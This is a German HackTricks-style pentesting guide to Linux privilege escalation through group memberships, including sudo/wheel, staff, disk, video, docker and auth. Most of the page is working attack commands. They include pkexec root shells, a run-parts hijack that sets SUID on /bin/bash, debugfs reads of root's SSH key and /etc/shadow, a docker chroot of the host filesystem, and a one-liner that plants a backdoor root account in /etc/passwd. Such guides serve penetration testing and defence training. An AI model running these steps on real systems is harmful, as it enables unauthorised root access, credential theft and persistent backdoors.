# Interessante Gruppen - Linux Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Sudo-/Admin-Gruppen

### **PE - Methode 1**

**Manchmal** findest du **standardmäßig (oder weil manche Software dies benötigt)** in der Datei **/etc/sudoers** einige dieser Zeilen:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
Das bedeutet, dass **jeder Benutzer, der zur Gruppe sudo oder admin gehört, alles mit sudo ausführen kann**.

Falls dies der Fall ist, kannst du **root werden, indem du einfach Folgendes ausführst**:
```
sudo su
```
### PE - Methode 2

Finde alle suid-Binärdateien und prüfe, ob die Binärdatei **Pkexec** vorhanden ist:
```bash
find / -perm -4000 2>/dev/null
```
Wenn du feststellst, dass die Binärdatei **pkexec eine SUID-Binärdatei ist** und du der Gruppe **sudo** oder **admin** angehörst, kannst du wahrscheinlich mithilfe von `pkexec` Binärdateien als sudo ausführen.\
Der Grund dafür ist, dass dies typischerweise die Gruppen innerhalb der **polkit policy** sind. Diese Policy legt im Grunde fest, welche Gruppen `pkexec` verwenden können. Überprüfe dies mit:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
Dort findest du, welche Gruppen **pkexec** ausführen dürfen, und **standardmäßig** sind in einigen Linux-Distributionen die Gruppen **sudo** und **admin** enthalten.

Um **root zu werden, kannst du Folgendes ausführen**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
Wenn du versuchst, **pkexec** auszuführen und diese **Fehlermeldung** erhältst:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**Es liegt nicht daran, dass du keine Berechtigungen hast, sondern daran, dass du ohne eine GUI nicht verbunden bist**. Eine Lösung für dieses Problem gibt es hier: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Du benötigst **2 verschiedene ssh-Sitzungen**:<sup>[[1]](#references)</sup>
```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
## Wheel-Gruppe

**Manchmal** finden Sie **standardmäßig** in der Datei **/etc/sudoers** diese Zeile:
```
%wheel	ALL=(ALL:ALL) ALL
```
Das bedeutet, dass **jeder Benutzer, der der Gruppe wheel angehört, alles mit sudo ausführen kann**.

Falls dies der Fall ist, kannst du **einfach Folgendes ausführen, um root zu werden**:
```
sudo su
```
## Shadow-Gruppe

Benutzer aus der **Gruppe shadow** können die Datei **/etc/shadow** **lesen**:
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
Also lies die Datei und versuche, einige **Hashes zu cracken**.

Kurze Erläuterung zum Sperrstatus bei der Analyse von Hashes:
- Einträge mit `!` oder `*` sind für Passwort-Logins im Allgemeinen nicht interaktiv.
- `!hash` bedeutet normalerweise, dass ein Passwort gesetzt und anschließend gesperrt wurde.
- `*` bedeutet normalerweise, dass nie ein gültiger Passwort-Hash gesetzt wurde.
Dies ist für die Kontoklassifizierung nützlich, selbst wenn der direkte Login blockiert ist.

## Staff Group

**staff**: Ermöglicht es Benutzern, lokale Änderungen am System (`/usr/local`) vorzunehmen, ohne Root-Berechtigungen zu benötigen (beachte, dass sich ausführbare Dateien in `/usr/local/bin` in der PATH-Variable jedes Benutzers befinden und ausführbare Dateien in `/bin` und `/usr/bin` mit demselben Namen möglicherweise „überschreiben“). Vergleiche dies mit der Gruppe „adm“, die eher für Monitoring/Sicherheit zuständig ist. [\[source\]](https://wiki.debian.org/SystemGroups)<sup>[[2]](#references)</sup>

In Debian-Distributionen zeigt die `$PATH`-Variable, dass `/usr/local/` mit der höchsten Priorität ausgeführt wird, unabhängig davon, ob du ein privilegierter Benutzer bist oder nicht.
```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
Wenn wir einige Programme in `/usr/local` kapern können, können wir problemlos root werden.

Das Hijacking des Programms `run-parts` ist eine einfache Möglichkeit, root zu werden, da viele Programme `run-parts` ausführen (z. B. `crontab` und beim SSH-Login).
```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```
oder wenn eine neue SSH-Sitzung gestartet wird.
```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```
**Exploit**
```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```
## Disk Group

Dieses Privileg ist **fast gleichbedeutend mit Root-Zugriff**, da du auf alle Daten innerhalb der Maschine zugreifen kannst.

Dateien:`/dev/sd[a-z][1-9]`
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
Beachte, dass du mit debugfs auch **Dateien schreiben** kannst. Um beispielsweise `/tmp/asd1.txt` nach `/tmp/asd2.txt` zu kopieren, kannst du Folgendes tun:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
Wenn du jedoch versuchst, **Dateien zu schreiben, die root gehören** (z. B. `/etc/shadow` oder `/etc/passwd`), erhältst du den Fehler "**Permission denied**".

## Video-Gruppe

Mit dem Befehl `w` kannst du herausfinden, **wer am System angemeldet ist**. Dabei wird eine Ausgabe wie die folgende angezeigt:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
**tty1** bedeutet, dass der Benutzer **yossi physisch an einem Terminal auf dem Rechner angemeldet ist**.

Die Gruppe **video** hat Zugriff auf die Bildschirmausgabe. Im Grunde könnt ihr die Bildschirme beobachten. Dazu müsst ihr das **aktuelle Bild auf dem Bildschirm** als Rohdaten abrufen und die vom Bildschirm verwendete Auflösung ermitteln. Die Bildschirmausgabe kann in `/dev/fb0` gespeichert werden, und die Auflösung dieses Bildschirms findet ihr unter `/sys/class/graphics/fb0/virtual_size`
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
Um das **Rohbild** zu **öffnen**, kannst du **GIMP** verwenden, die Datei **`screen.raw`** auswählen und als Dateityp **Raw image data** auswählen:

![Disk Group - Video Group: Um das Rohbild zu öffnen, kannst du GIMP verwenden, die Datei screen.raw auswählen und als Dateityp Raw image data auswählen](<../../../images/image (463).png>)

Ändere anschließend die Breite und Höhe auf die auf dem Bildschirm verwendeten Werte und überprüfe die verschiedenen Bildtypen (und wähle denjenigen aus, der den Bildschirm am besten darstellt):

![Disk Group - Video Group: Ändere anschließend die Breite und Höhe auf die auf dem Bildschirm verwendeten Werte und überprüfe die verschiedenen Bildtypen (und wähle denjenigen aus, der den Bildschirm am besten darstellt)](<../../../images/image (317).png>)

## Root-Gruppe

Es sieht so aus, als könnten **Mitglieder der Root-Gruppe** standardmäßig auf einige **Dienst**-Konfigurationsdateien, einige **Bibliotheks**dateien oder **andere interessante Dinge** zugreifen und diese **ändern**, was zur Eskalation von Privilegien verwendet werden könnte ...

**Überprüfe, welche Dateien Mitglieder der Root-Gruppe ändern können**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Docker Group

Du kannst das **Root-Dateisystem des Host-Computers in das Volume einer Instanz mounten**, sodass die Instanz beim Start sofort ein `chroot` in dieses Volume lädt. Dadurch erhältst du effektiv Root-Zugriff auf den Computer.
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
```
Wenn dir schließlich keine der vorherigen Empfehlungen zusagt oder sie aus irgendeinem Grund nicht funktionieren (Docker-API-Firewall?), könntest du immer noch versuchen, einen **privileged Container zu starten und daraus zu entkommen**, wie hier erklärt:

{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

Wenn du Schreibberechtigungen für den Docker-Socket hast, lies [**diesen Beitrag darüber, wie man durch Missbrauch des Docker-Sockets Privilegien eskaliert**](../../1-linux-basics/linux-privilege-escalation/index.html#writable-docker-socket)**.**

{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}

{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## lxc/lxd-Gruppe

{{#ref}}
./
{{#endref}}

## Adm-Gruppe

Normalerweise haben **Mitglieder** der Gruppe **`adm`** Berechtigungen zum **Lesen von Log**-Dateien, die sich in _/var/log/_ befinden.\
Wenn du daher einen Benutzer innerhalb dieser Gruppe kompromittiert hast, solltest du dir unbedingt die **Logs ansehen**.

## Backup- / Operator- / lp- / Mail-Gruppen

Diese Gruppen sind häufig eher Vektoren zur **Credential-Entdeckung** als direkte Root-Vektoren:
- **backup**: kann Archive mit Konfigurationen, Schlüsseln, DB-Dumps oder Tokens offenlegen.
- **operator**: plattformspezifischer operativer Zugriff, durch den sensible Laufzeitdaten geleakt werden können.
- **lp**: Druckwarteschlangen und Spools können Dokumentinhalte enthalten.
- **mail**: Mail-Spools können Reset-Links, OTPs und interne Credentials offenlegen.

Betrachte die Mitgliedschaft in diesen Gruppen als Befund mit hohem Wert hinsichtlich der Datenoffenlegung und führe einen Pivot über die Wiederverwendung von Passwörtern/Tokens durch.

## Auth-Gruppe

Unter OpenBSD kann die **auth**-Gruppe normalerweise in die Verzeichnisse _**/etc/skey**_ und _**/var/db/yubikey**_ schreiben, sofern diese verwendet werden.\
Diese Berechtigungen können mit dem folgenden Exploit missbraucht werden, um **Privilegien** bis zu root zu **eskalieren**: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)

## Referenzen

- [1] [Authentifizierung von pkexec/pkttyagent ohne GUI-Sitzung (NixOS issue #18012)](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)
- [2] [SystemGroups - Debian Wiki](https://wiki.debian.org/SystemGroups)

{{#include ../../../banners/hacktricks-training.md}}
